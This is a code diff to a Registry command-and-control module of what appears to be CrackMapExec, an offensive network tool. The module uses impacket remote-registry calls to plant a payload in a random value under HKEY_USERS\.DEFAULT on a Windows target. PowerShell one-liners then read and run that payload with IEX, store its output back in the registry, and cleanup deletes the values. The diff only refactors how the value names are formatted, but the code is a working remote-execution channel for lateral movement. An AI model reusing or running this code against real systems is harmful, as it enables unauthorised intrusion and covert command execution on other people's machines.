@@ -3,7 +3,7 @@ from gevent import sleep
 from impacket.dcerpc.v5 import rrp
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.examples.secretsdump import RemoteOperations
-from cme.protocols.smb.c2 import C2
+from cme.c2 import C2
 from cme.helpers.powershell import ps_deflate_and_encode, ps_decode_and_inflate
 from cme.helpers.misc import gen_random_string
 
@@ -19,22 +19,17 @@ class Registry(C2):
     def __init__(self, proto, payload, exec_methods, force_ps32, ret_output):
         C2.__init__(self, proto, payload, exec_methods, force_ps32, ret_output)
 
-        self.reg_payload_value_names = []
+        #self.reg_payload_value_names = []
         self.reg_key_name = gen_random_string(8)
         self.reg_result_value_name = gen_random_string(8)
+        self.reg_payload_value_name = gen_random_string(8)
 
-        self.command_with_output = "$a = (Get-ItemProperty -Path Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\KEY_NAME -Name PVALUE_NAME).PVALUE_NAME; " \
+        self.command_with_output = "$a = (Get-ItemProperty -Path Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\{key_name} -Name {pvalue_name}).{pvalue_name}; " \
                                    "$out = IEX (Invoke-Decompress -Data $a) | Out-String; " \
-                                   "New-ItemProperty -Path Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\KEY_NAME -Name OVALUE_NAME -Value (Invoke-Compress -Data $out)"
+                                   "New-ItemProperty -Path Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\{key_name} -Name {ovalue_name} -Value (Invoke-Compress -Data $out)".format(key_name=self.reg_key_name, ovalue_name=self.reg_result_value_name, pvalue_name=self.reg_payload_value_name)
 
-        self.command_without_output = "$a = (Get-ItemProperty -Path Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\KEY_NAME -Name PVALUE_NAME).PVALUE_NAME; " \
-                                      "IEX (Invoke-Decompress -Data $a)"
-
-        self.command_with_output = self.command_with_output.replace('KEY_NAME', self.reg_key_name)
-        self.command_with_output = self.command_with_output.replace('OVALUE_NAME', self.reg_result_value_name)
-
-        self.command_without_output = self.command_without_output.replace('KEY_NAME', self.reg_key_name)
-        self.command_without_output = self.command_without_output.replace('OVALUE_NAME', self.reg_result_value_name)
+        self.command_without_output = "$a = (Get-ItemProperty -Path Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Microsoft\\{key_name} -Name {pvalue_name}).{pvalue_name}; " \
+                                      "IEX (Invoke-Decompress -Data $a)".format(key_name=self.reg_key_name, pvalue_name=self.reg_payload_value_name)
 
         self.remoteOps = RemoteOperations(self.connection, False)
         self.remoteOps.enableRegistry()
@@ -70,18 +65,18 @@ class Registry(C2):
         #    for chunk in self.chunkstring(payload, 999999):
         #        self.write(chunk)
         #else:
-        value_name = gen_random_string(8)
+        #value_name = gen_random_string(8)
 
         ans = rrp.hBaseRegOpenKey(self.remoteOps._RemoteOperations__rrp, self.regHandle, 'SOFTWARE\\Microsoft\\{}'.format(self.reg_key_name + '\x00'))
         keyHandle = ans['phkResult']
 
-        rrp.hBaseRegSetValue(self.remoteOps._RemoteOperations__rrp, keyHandle, value_name + '\x00', rrp.REG_SZ, payload)
-        logging.debug('Wrote payload to registry value {}'.format(value_name))
+        rrp.hBaseRegSetValue(self.remoteOps._RemoteOperations__rrp, keyHandle, self.reg_payload_value_name + '\x00', rrp.REG_SZ, payload)
+        logging.debug('Wrote payload to registry value {}'.format(self.reg_payload_value_name))
 
         rrp.hBaseRegCloseKey(self.remoteOps._RemoteOperations__rrp, keyHandle)
 
-        self.command_with_output = self.command_with_output.replace('PVALUE_NAME', value_name)
-        self.reg_payload_value_names.append(value_name)
+        #self.command_with_output = self.command_with_output.replace('PVALUE_NAME', value_name)
+        #self.reg_payload_value_names.append(value_name)
 
         #rtype, data = rrp.hBaseRegQueryValue(self.remoteOps._RemoteOperations__rrp, keyHandle, 'UseLogonCredential\x00')
 
@@ -101,12 +96,12 @@ class Registry(C2):
         rrp.hBaseRegCloseKey(self.remoteOps._RemoteOperations__rrp, keyHandle)
 
     def cleanup(self):
-        self.reg_payload_value_names.append(self.reg_result_value_name)
+        #self.reg_payload_value_names.append(self.reg_result_value_name)
 
         ans = rrp.hBaseRegOpenKey(self.remoteOps._RemoteOperations__rrp, self.regHandle, 'SOFTWARE\\Microsoft\\{}'.format(self.reg_key_name + '\x00'))
         keyHandle = ans['phkResult']
 
-        for value in self.reg_payload_value_names:
+        for value in [self.reg_payload_value_name, self.reg_result_value_name]:
             try:
                 rrp.hBaseRegDeleteValue(self.remoteOps._RemoteOperations__rrp, keyHandle, value + '\x00')
                 logging.debug('Registry value {} deleted successfully'.format(value))
